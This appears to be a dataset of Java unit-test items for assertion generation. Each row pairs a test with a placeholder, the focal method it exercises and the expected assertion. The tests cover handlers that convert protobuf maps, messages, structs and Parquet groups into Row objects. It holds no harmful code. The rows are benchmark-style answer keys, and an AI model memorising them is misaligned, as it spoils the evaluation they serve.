"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(1, TestMessage.newBuilder().setOrderNumber(""123"").setOrderDetails(""abc"").build()); complexMap.put(2, TestMessage.newBuilder().setOrderNumber(""456"").setOrderDetails(""efg"").build()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProto(dynamicMessage.getField(mapFieldDescriptor)));  ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return repeatedMessageHandler.transformFromProto(field); }"	assertEquals(2, outputValues.size())
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(0, TestMessage.newBuilder().setOrderNumber(""123"").setOrderDetails(""abc"").build()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProto(dynamicMessage.getField(mapFieldDescriptor)));  Row expected = Row.of(0, Row.of(""123"", """", ""abc"")); ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return repeatedMessageHandler.transformFromProto(field); }"	assertEquals(expected, outputValues.get(0))
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(1, TestMessage.getDefaultInstance()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProto(dynamicMessage.getField(mapFieldDescriptor)));  Row expected = Row.of(1, Row.of("""", """", """"));  ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return repeatedMessageHandler.transformFromProto(field); }"	assertEquals(expected, outputValues.get(0))
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(0, TestMessage.getDefaultInstance()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProto(dynamicMessage.getField(mapFieldDescriptor)));  Row expected = Row.of(0, Row.of("""", """", """"));  ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return repeatedMessageHandler.transformFromProto(field); }"	assertEquals(expected, outputValues.get(0))
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(0, TestMessage.newBuilder().setOrderNumber("""").setOrderDetails("""").build()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build();  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProto(dynamicMessage.getField(mapFieldDescriptor)));  Row expected = Row.of(0, Row.of("""", """", """")); ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return repeatedMessageHandler.transformFromProto(field); }"	assertEquals(expected, outputValues.get(0))
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); MapEntry<String, String> mapEntry = MapEntry .newDefaultInstance(mapFieldDescriptor.getMessageType(), WireFormat.FieldType.STRING, """", WireFormat.FieldType.STRING, """"); TestBookingLogMessage driverProfileFlattenLogMessage = TestBookingLogMessage .newBuilder() .addRepeatedField(mapFieldDescriptor, mapEntry.toBuilder().setKey(""a"").setValue(""123"").buildPartial()) .addRepeatedField(mapFieldDescriptor, mapEntry.toBuilder().setKey(""b"").setValue(""456"").buildPartial()) .build(); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestBookingLogMessage.getDescriptor());  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestBookingLogMessage.getDescriptor(), driverProfileFlattenLogMessage.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProtoUsingCache(dynamicMessage.getField(mapFieldDescriptor), fieldDescriptorCache));  ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return repeatedMessageHandler.transformFromProtoUsingCache(field, cache); }"	assertEquals(2, outputValues.size())
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(1, TestMessage.newBuilder().setOrderNumber(""123"").setOrderDetails(""abc"").build()); complexMap.put(2, TestMessage.newBuilder().setOrderNumber(""456"").setOrderDetails(""efg"").build()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build(); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestComplexMap.getDescriptor());  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProtoUsingCache(dynamicMessage.getField(mapFieldDescriptor), fieldDescriptorCache));  ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return repeatedMessageHandler.transformFromProtoUsingCache(field, cache); }"	assertEquals(2, outputValues.size())
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(0, TestMessage.newBuilder().setOrderNumber(""123"").setOrderDetails(""abc"").build()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build(); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestComplexMap.getDescriptor());  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProtoUsingCache(dynamicMessage.getField(mapFieldDescriptor), fieldDescriptorCache));  Row expected = Row.of(0, Row.of(""123"", """", ""abc"")); ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return repeatedMessageHandler.transformFromProtoUsingCache(field, cache); }"	assertEquals(expected, outputValues.get(0))
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(1, TestMessage.getDefaultInstance()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build(); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestComplexMap.getDescriptor());  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProtoUsingCache(dynamicMessage.getField(mapFieldDescriptor), fieldDescriptorCache));  Row expected = Row.of(1, Row.of("""", """", """"));  ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return repeatedMessageHandler.transformFromProtoUsingCache(field, cache); }"	assertEquals(expected, outputValues.get(0))
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(0, TestMessage.getDefaultInstance()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build(); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestComplexMap.getDescriptor());  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProtoUsingCache(dynamicMessage.getField(mapFieldDescriptor), fieldDescriptorCache));  Row expected = Row.of(0, Row.of("""", """", """"));  ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return repeatedMessageHandler.transformFromProtoUsingCache(field, cache); }"	assertEquals(expected, outputValues.get(0))
"InvalidProtocolBufferException { Descriptors.FieldDescriptor mapFieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); Map<Integer, TestMessage> complexMap = new HashMap<>(); complexMap.put(0, TestMessage.newBuilder().setOrderNumber("""").setOrderDetails("""").build()); TestComplexMap testComplexMap = TestComplexMap.newBuilder().putAllComplexMap(complexMap).build(); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestComplexMap.getDescriptor());  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestComplexMap.getDescriptor(), testComplexMap.toByteArray());  List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromProtoUsingCache(dynamicMessage.getField(mapFieldDescriptor), fieldDescriptorCache));  Row expected = Row.of(0, Row.of("""", """", """")); ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return repeatedMessageHandler.transformFromProtoUsingCache(field, cache); }"	assertEquals(expected, outputValues.get(0))
"shouldReturnEmptyArrayOfRowIfNullPassedForTransformForKafka() { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); List<Object> outputValues = Arrays.asList((Object[]) mapHandler.transformFromPostProcessor(null));  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { ArrayList<Row> rows = new ArrayList<>(); if (field == null) { return rows.toArray(); } if (field instanceof Map) { Map<String, ?> mapField = (Map<String, ?>) field; for (Entry<String, ?> entry : mapField.entrySet()) { Descriptors.FieldDescriptor keyDescriptor = fieldDescriptor.getMessageType().findFieldByName(""key""); Descriptors.FieldDescriptor valueDescriptor = fieldDescriptor.getMessageType().findFieldByName(""value""); TypeHandler handler = TypeHandlerFactory.getTypeHandler(keyDescriptor); Object key = handler.transformFromPostProcessor(entry.getKey()); Object value = TypeHandlerFactory.getTypeHandler(valueDescriptor).transformFromPostProcessor(entry.getValue()); rows.add(Row.of(key, value)); } return rows.toArray(); } if (field instanceof List) { return repeatedMessageHandler.transformFromPostProcessor(field); } return rows.toArray(); }"	assertEquals(0, outputValues.size())
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor mapFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(mapFieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.OBJECT_ARRAY(TypeInformationFactory.getRowType(fieldDescriptor.getMessageType())); }"	"assertEquals(Types.OBJECT_ARRAY(Types.ROW_NAMED(new String[]{""key"", ""value""}, Types.STRING, Types.STRING)), mapHandler.getTypeInformation())"
"shouldReturnEmptyRowArrayWhenHandlingASimpleGroupNotContainingTheMapField() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(fieldDescriptor); MessageType parquetSchema = buildMessage() .named(""TestBookingLogMessage""); SimpleGroup mainMessage = new SimpleGroup(parquetSchema);  Row[] actualRows = (Row[]) mapHandler.transformFromParquet(mainMessage);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { if (checkIsLegacySimpleGroupMap(simpleGroup, fieldName)) { return transformLegacyMapFromSimpleGroup(simpleGroup, fieldName); } else if (checkIsStandardSimpleGroupMap(simpleGroup, fieldName)) { return transformStandardMapFromSimpleGroup(simpleGroup, fieldName); } } return new Row[0]; }"	assertArrayEquals(new Row[0], actualRows)
"shouldReturnEmptyRowArrayWhenHandlingASimpleGroupWithStandardSpecMapFieldNotInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(fieldDescriptor);  GroupType mapSchema = requiredMap() .key(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()) .requiredValue(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()) .named(""metadata""); MessageType parquetSchema = buildMessage() .addField(mapSchema) .named(""TestBookingLogMessage""); SimpleGroup mainMessage = new SimpleGroup(parquetSchema);  Row[] actualRows = (Row[]) mapHandler.transformFromParquet(mainMessage);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { if (checkIsLegacySimpleGroupMap(simpleGroup, fieldName)) { return transformLegacyMapFromSimpleGroup(simpleGroup, fieldName); } else if (checkIsStandardSimpleGroupMap(simpleGroup, fieldName)) { return transformStandardMapFromSimpleGroup(simpleGroup, fieldName); } } return new Row[0]; }"	assertArrayEquals(new Row[0], actualRows)
"shouldReturnEmptyRowArrayWhenHandlingASimpleGroupWithLegacySpecMapFieldNotInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(fieldDescriptor);  GroupType mapSchema = repeatedGroup() .optional(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()).named(""key"") .optional(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()).named(""value"") .named(""metadata""); MessageType parquetSchema = buildMessage() .addField(mapSchema) .named(""TestBookingLogMessage""); SimpleGroup mainMessage = new SimpleGroup(parquetSchema);  Row[] actualRows = (Row[]) mapHandler.transformFromParquet(mainMessage);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { if (checkIsLegacySimpleGroupMap(simpleGroup, fieldName)) { return transformLegacyMapFromSimpleGroup(simpleGroup, fieldName); } else if (checkIsStandardSimpleGroupMap(simpleGroup, fieldName)) { return transformStandardMapFromSimpleGroup(simpleGroup, fieldName); } } return new Row[0]; }"	assertArrayEquals(new Row[0], actualRows)
"shouldReturnEmptyRowArrayWhenHandlingNullSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(fieldDescriptor);  Row[] actualRows = (Row[]) mapHandler.transformFromParquet(null);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { if (checkIsLegacySimpleGroupMap(simpleGroup, fieldName)) { return transformLegacyMapFromSimpleGroup(simpleGroup, fieldName); } else if (checkIsStandardSimpleGroupMap(simpleGroup, fieldName)) { return transformStandardMapFromSimpleGroup(simpleGroup, fieldName); } } return new Row[0]; }"	assertArrayEquals(new Row[0], actualRows)
"shouldUseDefaultKeyAsPerTypeWhenHandlingSimpleGroupAndStandardSpecMapEntryDoesNotHaveKeyInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(fieldDescriptor);  GroupType keyValueSchema = requiredGroup() .required(PrimitiveType.PrimitiveTypeName.BINARY).named(""key"") .required(PrimitiveType.PrimitiveTypeName.BINARY).named(""value"") .named(""key_value""); GroupType mapSchema = requiredMap() .key(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()) .requiredValue(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()) .named(""metadata""); MessageType parquetSchema = buildMessage() .addField(mapSchema) .named(""TestBookingLogMessage"");  /* Creating a map entry and only initializing the value but not the key */ SimpleGroup keyValue = new SimpleGroup(keyValueSchema); keyValue.add(""value"", ""DC"");  SimpleGroup mapMessage = new SimpleGroup(mapSchema); mapMessage.add(""key_value"", keyValue);  SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""metadata"", mapMessage);  Row[] actualRows = (Row[]) mapHandler.transformFromParquet(mainMessage); Row[] expectedRows = new Row[]{Row.of("""", ""DC"")};  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { if (checkIsLegacySimpleGroupMap(simpleGroup, fieldName)) { return transformLegacyMapFromSimpleGroup(simpleGroup, fieldName); } else if (checkIsStandardSimpleGroupMap(simpleGroup, fieldName)) { return transformStandardMapFromSimpleGroup(simpleGroup, fieldName); } } return new Row[0]; }"	assertArrayEquals(expectedRows, actualRows)
"shouldUseDefaultKeyAsPerTypeWhenHandlingSimpleGroupAndLegacySpecMapEntryDoesNotHaveKeyInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(fieldDescriptor);  GroupType mapSchema = repeatedGroup() .optional(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()).named(""key"") .optional(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()).named(""value"") .named(""metadata""); MessageType parquetSchema = buildMessage() .addField(mapSchema) .named(""TestBookingLogMessage"");  /* Creating a map entry and only initializing the value but not the key */ SimpleGroup keyValue = new SimpleGroup(mapSchema); keyValue.add(""value"", ""DC"");  SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""metadata"", keyValue);  Row[] actualRows = (Row[]) mapHandler.transformFromParquet(mainMessage); Row[] expectedRows = new Row[]{Row.of("""", ""DC"")};  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { if (checkIsLegacySimpleGroupMap(simpleGroup, fieldName)) { return transformLegacyMapFromSimpleGroup(simpleGroup, fieldName); } else if (checkIsStandardSimpleGroupMap(simpleGroup, fieldName)) { return transformStandardMapFromSimpleGroup(simpleGroup, fieldName); } } return new Row[0]; }"	assertArrayEquals(expectedRows, actualRows)
"shouldUseDefaultValueAsPerTypeWhenHandlingSimpleGroupAndStandardSpecMapEntryDoesNotHaveValueInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestComplexMap.getDescriptor().findFieldByName(""complex_map""); MapHandler mapHandler = new MapHandler(fieldDescriptor);  GroupType valueSchema = requiredGroup() .required(PrimitiveType.PrimitiveTypeName.BINARY).named(""order_number"") .required(PrimitiveType.PrimitiveTypeName.BINARY).named(""order_url"") .required(PrimitiveType.PrimitiveTypeName.BINARY).named(""order_details"") .named(""value""); GroupType keyValueSchema = requiredGroup() .required(PrimitiveType.PrimitiveTypeName.INT32).named(""key"") .addField(valueSchema) .named(""key_value""); GroupType mapSchema = requiredMap() .key(PrimitiveType.PrimitiveTypeName.INT32) .value(valueSchema) .named(""complex_map""); MessageType parquetSchema = buildMessage() .addField(mapSchema) .named(""TestComplexMap"");  SimpleGroup keyValue = new SimpleGroup(keyValueSchema); keyValue.add(""key"", 10);  /* Just creating an empty simple group for the value, without initializing any of the fields in it */ SimpleGroup value = new SimpleGroup(valueSchema); keyValue.add(""value"", value);  SimpleGroup mapMessage = new SimpleGroup(mapSchema); mapMessage.add(""key_value"", keyValue);  SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""complex_map"", mapMessage);  Row[] actualRows = (Row[]) mapHandler.transformFromParquet(mainMessage); Row[] expectedRows = new Row[]{ Row.of(10, Row.of("""", """", """"))};  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { if (checkIsLegacySimpleGroupMap(simpleGroup, fieldName)) { return transformLegacyMapFromSimpleGroup(simpleGroup, fieldName); } else if (checkIsStandardSimpleGroupMap(simpleGroup, fieldName)) { return transformStandardMapFromSimpleGroup(simpleGroup, fieldName); } } return new Row[0]; }"	assertArrayEquals(expectedRows, actualRows)
"shouldUseDefaultValueAsPerTypeWhenHandlingSimpleGroupAndLegacySpecMapEntryDoesNotHaveValueInitialized() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(fieldDescriptor);  GroupType mapSchema = repeatedGroup() .optional(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()).named(""key"") .optional(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()).named(""value"") .named(""metadata""); MessageType parquetSchema = buildMessage() .addField(mapSchema) .named(""TestBookingLogMessage"");  /* Creating a map entry and only initializing the key but not the value */ SimpleGroup keyValue = new SimpleGroup(mapSchema); keyValue.add(""key"", ""Superman"");  SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""metadata"", keyValue);  Row[] actualRows = (Row[]) mapHandler.transformFromParquet(mainMessage); Row[] expectedRows = new Row[]{Row.of(""Superman"", """")};  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { if (checkIsLegacySimpleGroupMap(simpleGroup, fieldName)) { return transformLegacyMapFromSimpleGroup(simpleGroup, fieldName); } else if (checkIsStandardSimpleGroupMap(simpleGroup, fieldName)) { return transformStandardMapFromSimpleGroup(simpleGroup, fieldName); } } return new Row[0]; }"	assertArrayEquals(expectedRows, actualRows)
"shouldReturnEmptyRowArrayWhenHandlingSimpleGroupAndMapFieldDoesNotConformWithAnySpec() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""metadata""); MapHandler mapHandler = new MapHandler(fieldDescriptor);  GroupType mapSchema = repeatedGroup() .optional(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()).named(""random_key"") .optional(PrimitiveType.PrimitiveTypeName.BINARY).as(LogicalTypeAnnotation.stringType()).named(""random_value"") .named(""metadata""); MessageType parquetSchema = buildMessage() .addField(mapSchema) .named(""TestBookingLogMessage"");  SimpleGroup keyValue = new SimpleGroup(mapSchema); keyValue.add(""random_key"", ""Superman""); keyValue.add(""random_value"", ""DC"");  SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""metadata"", keyValue);  Row[] actualRows = (Row[]) mapHandler.transformFromParquet(mainMessage);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { if (checkIsLegacySimpleGroupMap(simpleGroup, fieldName)) { return transformLegacyMapFromSimpleGroup(simpleGroup, fieldName); } else if (checkIsStandardSimpleGroupMap(simpleGroup, fieldName)) { return transformStandardMapFromSimpleGroup(simpleGroup, fieldName); } } return new Row[0]; }"	assertArrayEquals(new Row[]{}, actualRows)
"shouldReturnTrueIfMessageFieldDescriptorIsPassed() { Descriptors.FieldDescriptor messageFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""payment_option_metadata""); MessageHandler messageHandler = new MessageHandler(messageFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == MESSAGE && !fieldDescriptor.getMessageType().getFullName().equals(""google.protobuf.Timestamp""); }"	assertTrue(messageHandler.canHandle())
"shouldReturnFalseIfFieldDescriptorOtherThanMessageTypeIsPassed() { Descriptors.FieldDescriptor otherFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); MessageHandler messageHandler = new MessageHandler(otherFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == MESSAGE && !fieldDescriptor.getMessageType().getFullName().equals(""google.protobuf.Timestamp""); }"	assertFalse(messageHandler.canHandle())
"shouldReturnTypeInformation() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""payment_option_metadata""); TypeInformation actualTypeInformation = new MessageHandler(fieldDescriptor).getTypeInformation(); TypeInformation<Row> expectedTypeInformation = Types.ROW_NAMED(new String[]{""masked_card"", ""network""}, Types.STRING, Types.STRING); ""<AssertPlaceHolder>""; }
getTypeInformation() { return TypeInformationFactory.getRowType(fieldDescriptor.getMessageType()); }"	assertEquals(expectedTypeInformation, actualTypeInformation)
"shouldConvertComplexRowDataToJsonString() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""payment_option_metadata"");  Row inputRow = new Row(2); inputRow.setField(0, ""test1""); inputRow.setField(1, ""test2"");  Object value = new MessageHandler(fieldDescriptor).transformToJson(inputRow);  ""<AssertPlaceHolder>""; }
transformToJson(Object field) { if (jsonRowSerializationSchema == null) { jsonRowSerializationSchema = createJsonRowSchema(); } return new String(jsonRowSerializationSchema.serialize((Row) field)); }"	"assertEquals(""{""masked_card"":""test1"",""network"":""test2""}"", String.valueOf(value))"
"shouldReturnTrueForCanHandleForStructFieldDescriptor() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""profile_data""); StructMessageHandler structMessageHandler = new StructMessageHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE && fieldDescriptor.toProto().getTypeName().equals("".google.protobuf.Struct"") && !fieldDescriptor.isRepeated(); }"	assertTrue(structMessageHandler.canHandle())
"shouldReturnFalseForCanHandleForRepeatedStructFieldDescriptor() { Descriptors.FieldDescriptor repeatedEnumFieldDescriptor = TestRepeatedEnumMessage.getDescriptor().findFieldByName(""test_enums""); StructMessageHandler structMessageHandler = new StructMessageHandler(repeatedEnumFieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE && fieldDescriptor.toProto().getTypeName().equals("".google.protobuf.Struct"") && !fieldDescriptor.isRepeated(); }"	assertFalse(structMessageHandler.canHandle())
"shouldReturnFalseForCanHandleForMessageFieldDescriptor() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""driver_pickup_location""); StructMessageHandler structMessageHandler = new StructMessageHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE && fieldDescriptor.toProto().getTypeName().equals("".google.protobuf.Struct"") && !fieldDescriptor.isRepeated(); }"	assertFalse(structMessageHandler.canHandle())
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""profile_data""); StructMessageHandler structMessageHandler = new StructMessageHandler(fieldDescriptor); TypeInformation actualTypeInformation = structMessageHandler.getTypeInformation(); TypeInformation<Row> expectedTypeInformation = Types.ROW_NAMED(new String[]{}); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.ROW_NAMED(new String[]{}); }"	assertEquals(expectedTypeInformation, actualTypeInformation)
"shouldReturnNullWhenTransformFromParquetIsCalledWithAnyArgument() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""profile_data""); StructMessageHandler protoHandler = new StructMessageHandler(fieldDescriptor); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  ""<AssertPlaceHolder>""; }
